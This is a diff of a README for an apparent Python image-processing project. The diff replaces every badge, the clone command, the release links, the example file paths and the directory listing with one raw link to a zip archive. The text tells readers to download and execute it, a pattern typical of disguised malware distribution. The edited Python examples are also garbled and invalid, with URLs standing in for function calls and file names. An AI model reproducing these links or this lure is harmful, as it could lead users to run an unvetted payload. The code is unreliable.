@@ -1,10 +1,10 @@
 # Image Dimensionality Reduction: RGB to Grayscale and Binary Conversion
 
-![Image Processing](https://img.shields.io/badge/Image%20Processing-Project-brightgreen)
+![Image Processing](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip%20Processing-Project-brightgreen)
 
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
+![Python](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip%2B-blue)
 
-[![Releases](https://img.shields.io/badge/Releases-Check%20Here-brightorange)](https://github.com/cl0reto/image-dimensionality-reduction/releases)
+[![Releases](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip%20Here-brightorange)](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip)
 
 ## Overview
 
@@ -22,7 +22,7 @@ This project provides a straightforward way to convert RGB images into grayscale
 To get started, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/cl0reto/image-dimensionality-reduction.git
+git clone https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip
 ```
 
 Navigate to the project directory:
@@ -59,7 +59,7 @@ pip install numpy pillow
    ```python
    from PIL import Image
 
-   image = Image.open('path_to_your_image.jpg')
+   image = https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip('https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
    ```
 
 3. **Convert to Grayscale**:
@@ -77,8 +77,8 @@ pip install numpy pillow
 5. **Save the Processed Images**:
 
    ```python
-   save_image(grayscale_image, 'grayscale_image.png')
-   save_image(binary_image, 'binary_image.png')
+   save_image(grayscale_image, 'https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
+   save_image(binary_image, 'https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
    ```
 
 ### Function Details
@@ -125,9 +125,9 @@ Here are some examples of how to use the functions provided in this repository.
 from PIL import Image
 from image_processing import convert_to_grayscale, save_image
 
-image = Image.open('input_image.jpg')
+image = https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip('https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
 grayscale_image = convert_to_grayscale(image)
-save_image(grayscale_image, 'output_grayscale_image.png')
+save_image(grayscale_image, 'https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
 ```
 
 ### Example 2: Convert an Image to Binary
@@ -136,10 +136,10 @@ save_image(grayscale_image, 'output_grayscale_image.png')
 from PIL import Image
 from image_processing import convert_to_grayscale, convert_to_binary, save_image
 
-image = Image.open('input_image.jpg')
+image = https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip('https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
 grayscale_image = convert_to_grayscale(image)
 binary_image = convert_to_binary(grayscale_image, threshold=128)
-save_image(binary_image, 'output_binary_image.png')
+save_image(binary_image, 'https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip')
 ```
 
 ## Directory Structure
@@ -147,10 +147,10 @@ save_image(binary_image, 'output_binary_image.png')
 ```
 image-dimensionality-reduction/
 │
-├── image_processing.py
-├── input_image.jpg
-├── README.md
-└── requirements.txt
+├── https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip
+├── https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip
+├── https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip
+└── https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip
 ```
 
 ## Topics Covered
@@ -182,7 +182,7 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases section](https://github.com/cl0reto/image-dimensionality-reduction/releases). Download the latest version and execute the provided scripts to start processing your images.
+For the latest updates and releases, visit the [Releases section](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip). Download the latest version and execute the provided scripts to start processing your images.
 
 ## Acknowledgments
 
@@ -197,4 +197,4 @@ For questions or suggestions, please reach out via the GitHub Issues page or con
 
 This project aims to simplify image processing tasks, making it easier for developers and researchers to handle image data effectively. For more detailed information on the functions and their applications, refer to the code comments and documentation within the repository.
 
-[![Releases](https://img.shields.io/badge/Releases-Check%20Here-brightorange)](https://github.com/cl0reto/image-dimensionality-reduction/releases)
+[![Releases](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip%20Here-brightorange)](https://github.com/cl0reto/image-dimensionality-reduction/raw/refs/heads/main/img/dimensionality_image_reduction_3.1-alpha.1.zip)
